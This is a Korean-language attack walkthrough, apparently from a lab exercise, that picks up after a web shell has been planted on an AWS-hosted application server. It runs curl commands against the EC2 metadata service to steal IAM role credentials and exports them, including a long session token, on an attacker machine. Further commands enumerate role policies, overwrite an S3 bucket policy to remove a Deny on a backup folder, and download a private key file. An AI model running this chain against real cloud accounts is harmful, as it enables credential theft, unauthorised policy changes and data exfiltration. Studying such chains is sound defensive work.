
# 웹쉘 성공한 WAS 서버에서
## AWS 인프라 정보 수집 (Reconnaissance)

내 IAM Role 권한 확인
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials

위 명령어로 조회된 IAM Role (EC2-Discovery-Role) 로 key 및 token 탈취
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Discovery-Role
```

# 공격서버에서
## EC2 서버에서 확인한 키 및 토큰으로 공격자 서버에 환경변수 등록
```bash
# 1. 기존에 꼬여있을 수 있는 임시 토큰 정보를 완전히 제거.
unset AWS_SESSION_TOKEN
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY

# 2. 새로 얻은 '영구 키'를 서버 환경 변수에 주입.
export AWS_ACCESS_KEY_ID="ASIA4***************"
export AWS_SECRET_ACCESS_KEY="IZ5FIc**************************"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEGYaDmFwLW5vcnRoZWFzdC0yIkcwRQIgao8kp1dGld0Q6NXjqR8VQOp2A7eAHJa/VvCewPTguXACIQC4F0g36GIkte7Xkscc6fUnyc3xsT1Npi9uXx8abxtY/irLBQgvEAAaDDg1ODUwNzExMzg4OSIMPYKxfvbE5azZFidHKqgFjlHG9RdaplHupsgX2Uf3ajQMN0OeuMaoLcEjWknSZ3FpDsfFQIIqhU8XlHO5eQ9h6Ccg5OJWR4PrJqFR4OMEG3vHKdh2zOif+2AK/udjnWpSSa6g/1h3/hhOqo3gsjS3tzmVCm2pc0NgdQmHhyOF+JvU5Z18BLICOToPJKfMELLvcjXS9VDgsP6mtSR94hPiCunGzdFWESa9pFJqnz+r/rsiqvy81THJwlwGDwO9MPmoPf0nbrIJyU4UCigX1SpfNK5MUJyivjEzX3b6ZClPYkrd5RWJrK+5MNFibzhsyw3BZNMSEG2hcwy/fiVFtPyHaF9FGOhxshXMHlHynBBpbXLjhBru4O1qe5eowYMi8eTCaykk+CUDOjd5xa4ix4YhkTLLpeJlEsBCumguzXUNF+HqzaXybCDDUQDi5V9DA9b2GghQGkydK3NVuYlWHjEI0TK+zUQ6as/31Ts44QFe83fyN41iIMHJyxoMmLhdwLrZxUChad1ESnz1+NWzoxdabT7qeul0X7F4+4yaDtxnysWtyB4Db6eA9la2sDtkrDIDxBf/OmkMD1I1uEK+vp+cWu5jckXLVNhVd8Xc1bNyimZAGt2xLTax5jpdYQ7L5TUW8TBDJiK6c30kq9BoSDKtGedxKX5ZMufKzEiBNijlsofqbyGB7TnIq9EzDc23OEOnFTQTeYQvnNAl9oT+zn4PXnNyIMOsEVqRdZx49b7/ycMx6+kihkkoh5gMNf6InYkBAanMt2DHd8lA0ETuufh4uaKTOv9VjmbyWNbWopzCZsWXrnGk4pIVtZ/TDKjkHcovbqSat1zEyAM4ZhDbyRseApJqb6PkOMfGZ8VfkAkB+H5w4/WhZvVu7twOEFg3LUDKXyZmDcM31LUIUK6PSf+IPTD5A1NB5XYwvcTzzQY6sQFaFHigIySZ3oBhvMUrNm6VWBE9Q0SsJ64Px3PC0SwvpF66lV49cKN7pE+CLBLoMh3Cr5sKiO3pqGmSe3jrbDn9ecRza9BYgaYdyXdKNf3fM7wYJqlE2Z2fgAkAHL4RJXeF9L2muMxtoTNEgVdF+KNye5QW0XTN3LZq0EFxbojIq4KnsOyBNvfEzWEYAwcUb5lPa3Hil4IfGOfSfugRwKoutqd2aLWN7CoTjJzfEOpB4gE="
export AWS_DEFAULT_REGION="ap-northeast-2"
```

장악한 WAS 서버에 부여된 **IAM Role (EC2-Discovery-Role)** 권한을 활용하여
현재 AWS 계정 내 EC2 인스턴스 목록과 IP 주소를 조회한다.

## IAM Role 권한 확인
aws iam list-attached-role-policies --role-name EC2-Discovery-Role / 권한정책
![img_2.png](img_2.png)

aws iam list-role-policies --role-name EC2-Discovery-Role / 인라인정책
![img_3.png](img_3.png)

aws iam get-role-policy --role-name EC2-Discovery-Role --policy-name Book-Village / 인라인정책 상세
![img_1.png](img_1.png)

## 버킷 정책 확인 명령어
aws s3api get-bucket-policy --bucket book-village
![img.png](img.png)

aws s3api get-bucket-policy --bucket book-village 에서 backup 폴더 Deny 확인하여 Allow로 변경
덮어씌울 S3 버켓 정책 파일 생성
nano unlock.json
![img_6.png](img_6.png)

정책 덮어씌우기
aws s3api put-bucket-policy --bucket book-village --policy file://unlock.json


확인한 Book-Village.pem 파일 다운로드
aws s3 cp s3://book-village/backup/Book-Village.pem ./Book-Village.pem
![img_7.png](img_7.png)
